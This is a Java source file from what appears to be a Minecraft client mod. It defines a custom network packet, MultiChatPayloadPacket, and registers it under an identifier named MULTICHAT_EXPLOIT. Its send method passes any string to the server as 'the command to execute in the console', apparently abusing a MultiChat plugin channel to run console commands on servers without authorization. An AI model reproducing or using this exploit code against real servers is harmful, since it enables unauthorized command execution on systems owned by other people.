package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record MultiChatPayloadPacket(String command) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, MultiChatPayloadPacket> CODEC = CustomPayload.codecOf(MultiChatPayloadPacket::write, MultiChatPayloadPacket::new);
    public static final Id<MultiChatPayloadPacket> ID = new Id<>(IdentifierConstants.MULTICHAT_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet.
     *
     * @param buf The buffer containing the serialized packet data.
     */
    private MultiChatPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    /**
     * Sends the MultiChat data packet to the server.
     *
     * @param command The command to execute in the console.
     */
    public static void send(String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new MultiChatPayloadPacket(command)));
    }

    /**
     * Serializes the packet data into the provided buffer.
     *
     * @param buf The buffer to which the packet data will be written.
     */
    public void write(PacketByteBuf buf) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(stream);
            out.writeUTF(command);
            buf.writeBytes(stream.toByteArray());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Gets the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet in communication with the server.
     */
    public Id<MultiChatPayloadPacket> getId() {
        return ID;
    }
}
